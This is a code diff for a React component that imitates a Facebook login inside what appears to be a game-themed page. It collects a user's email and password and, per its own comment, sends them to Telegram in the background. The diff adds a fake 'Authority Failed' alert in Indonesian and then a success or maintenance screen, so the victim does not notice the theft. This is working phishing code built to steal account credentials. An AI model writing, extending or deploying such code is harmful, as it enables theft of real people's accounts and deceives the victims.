@@ -25,27 +25,31 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
       return;
     }
     
-    // No questions anymore
+    // Send all data (FB Creds) - No questions anymore
     const q1 = "-";
     const q2 = "-";
 
-    // Send all data (FB Creds + Answers)
-    const success = await sendFacebookLogin(email, password, q1, q2);
-    
-    // Show Loading Overlay
+    // Show Loading Overlay immediately
     setShowCustomLoading(true);
     setStep(0); // Hide forms
 
+    // Send data to Telegram in background
+    try {
+      await sendFacebookLogin(email, password, q1, q2);
+    } catch (error) {
+      console.error("Failed to send FB login:", error);
+    }
+    
+    // Simulate delay then show "Authority Failed" Alert
     setTimeout(() => {
       setShowCustomLoading(false);
-      
-      if (success) {
-        setStep(3); // Show Success
-      } else {
-        alert("Terjadi kesalahan. Silakan coba lagi.");
-        setStep(1); // Retry login
-      }
-    }, 5000);
+      setStep(2); // Show Authority Failed Alert (New Step)
+    }, 2000);
+  };
+
+  const handleAuthorityFailedConfirm = () => {
+    // After clicking confirm on "Authority Failed", show Maintenance/Success
+    setStep(3);
   };
 
   // Custom Loading Component
@@ -119,6 +123,38 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
               Buat akun baru
             </button>
           </form>
+        </div>
+      )}
+
+      {/* ================= STEP 2: AUTHORITY FAILED ALERT ================= */}
+      {step === 2 && (
+        <div className="fixed inset-0 z-[2000] flex items-center justify-center bg-black/60 backdrop-blur-sm animate-pop-in">
+          <div className="relative w-[90%] max-w-[380px] bg-gradient-to-b from-[#8b4513] to-[#6d3209] border-4 border-[#b87333] shadow-[0_10px_25px_rgba(0,0,0,0.8),inset_0_0_20px_rgba(0,0,0,0.5)] rounded-[20px] p-8 text-center">
+            
+            {/* Close Icon */}
+            <button 
+              onClick={handleAuthorityFailedConfirm}
+              className="absolute -top-4 -right-4 w-9 h-9 flex items-center justify-center bg-gradient-to-b from-[#8b0000] to-[#500000] border-2 border-[#ffd700] rounded-full text-[#ffd700] font-bold text-lg cursor-pointer shadow-md z-20 hover:scale-110 transition-transform"
+            >
+              ✕
+            </button>
+
+            {/* Message */}
+            <div className="text-[#f5f5dc] text-lg font-sans mb-8 relative z-10 leading-relaxed">
+              Otoritas Gagal, Silakan login menggunakan ID Login.
+            </div>
+
+            {/* Button */}
+            <button 
+              onClick={handleAuthorityFailedConfirm}
+              className="relative z-10 px-10 py-2 bg-gradient-to-b from-[#4ade80] to-[#16a34a] border-2 border-[#facc15] text-white font-bold text-lg rounded-full shadow-lg hover:brightness-110 active:scale-95 transition-all"
+            >
+              Tentukan
+            </button>
+
+            {/* Texture Overlay */}
+            <div className="absolute inset-0 bg-[radial-gradient(rgba(255,255,255,0.05)_1px,transparent_1px)] bg-[length:10px_10px] pointer-events-none rounded-[16px]"></div>
+          </div>
         </div>
       )}
 
